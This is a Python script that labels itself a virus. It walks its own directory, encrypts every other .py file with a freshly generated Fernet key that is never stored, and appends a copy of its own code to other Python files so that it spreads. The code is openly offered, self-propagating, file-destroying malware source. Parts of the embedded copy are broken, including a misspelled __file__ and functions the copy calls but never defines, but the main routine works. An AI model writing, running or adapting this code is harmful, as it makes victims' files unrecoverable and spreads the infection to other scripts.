import os
from cryptography.fernet import Fernet

def encrypt_script(script_path, key):
    # Read the content of the script file
    with open(script_path, 'r') as file:
        script_content = file.read()

    # Initialize Fernet cipher with the provided key
    cipher_suite = Fernet(key)
    
    # Encrypt the script content
    encrypted_script = cipher_suite.encrypt(script_content.encode())

    # Write the encrypted content back to the script file
    with open(script_path, 'wb') as file:
        file.write(encrypted_script)

def decrypt_script(script_path, key):
    # Read the encrypted content of the script file
    with open(script_path, 'rb') as file:
        encrypted_script = file.read()

    # Initialize Fernet cipher with the provided key
    cipher_suite = Fernet(key)

    # Decrypt the script content
    decrypted_script = cipher_suite.decrypt(encrypted_script).decode()

    # Write the decrypted content back to the script file
    with open(script_path, 'w') as file:
        file.write(decrypted_script)

def attach_to_other_scripts(virus_path, key):
    # Get the directory of the virus script
    script_directory = os.path.dirname(os.path.abspath(virus_path))

    for root, dirs, files in os.walk(script_directory):
        for file in files:
            if file.endswith('.py') and not file == os.path.basename(virus_path):
                script_path = os.path.join(root, file)

                # Read the content of the target script
                with open(script_path, 'r') as file:
                    script_content = file.read()

                # Check if the virus code is not already present in the script
                if "attach_to_other_scripts" not in script_content:
                    # Append the virus code to the target script
                    with open(script_path, 'a') as file:
                        file.write('\n\n' + virus_code)

def generate_key():
    # Generate a key for Fernet encryption
    return Fernet.generate_key()

# Get the virus code
virus_code = """
import os
from cryptography.fernet import Fernet

def encrypt_script(script_path, key):
    # Read the content of the script file
    with open(script_path, 'r') as file:
        script_content = file.read()

    # Initialize Fernet cipher with the provided key
    cipher_suite = Fernet(key)
    
    # Encrypt the script content
    encrypted_script = cipher_suite.encrypt(script_content.encode())

    # Write the encrypted content back to the script file
    with open(script_path, 'wb') as file:
        file.write(encrypted_script)

def decrypt_script(script_path, key):
    # Read the encrypted content of the script file
    with open(script_path, 'rb') as file:
        encrypted_script = file.read()

    # Initialize Fernet cipher with the provided key
    cipher_suite = Fernet(key)

    # Decrypt the script content
    decrypted_script = cipher_suite.decrypt(encrypted_script).decode()

    # Write the decrypted content back to the script file
    with open(script_path, 'w') as file:
        file.write(decrypted_script)

def attach_to_other_scripts(virus_path, key):
    # Get the directory of the virus script
    script_directory = os.path.dirname(os.path.abspath(virus_path))

    for root, dirs, files in os.walk(script_directory):
        for file in files:
            if file.endswith('.py') and not file == os.path.basename(virus_path):
                script_path = os.path.join(root, file)

                # Read the content of the target script
                with open(script_path, 'r') as file:
                    script_content = file.read()

                # Check if the virus code is not already present in the script
                if "attach_to_other_scripts" not in script_content:
                    # Append the virus code to the target script
                    with open(script_path, 'a') as file:
                        file.write('\\n\\n' + virus_code)

# Usage example
virus_path = os.path.abspath(_file_)
encryption_key = generate_key()
encrypt_files_in_own_directory(encryption_key)
attach_to_other_scripts(virus_path, encryption_key)
"""

def encrypt_files_in_own_directory(key):
    # Get the directory of the virus script
    script_directory = os.path.dirname(os.path.abspath(__file__))

    for root, dirs, files in os.walk(script_directory):
        for file in files:
            if file.endswith('.py') and not file == os.path.basename(__file__):
                script_path = os.path.join(root, file)
                # Encrypt each script in the directory
                encrypt_script(script_path, key)

# Usage example
virus_path = os.path.abspath(__file__)
encryption_key = generate_key()
encrypt_files_in_own_directory(encryption_key)
attach_to_other_scripts(virus_path, encryption_key)
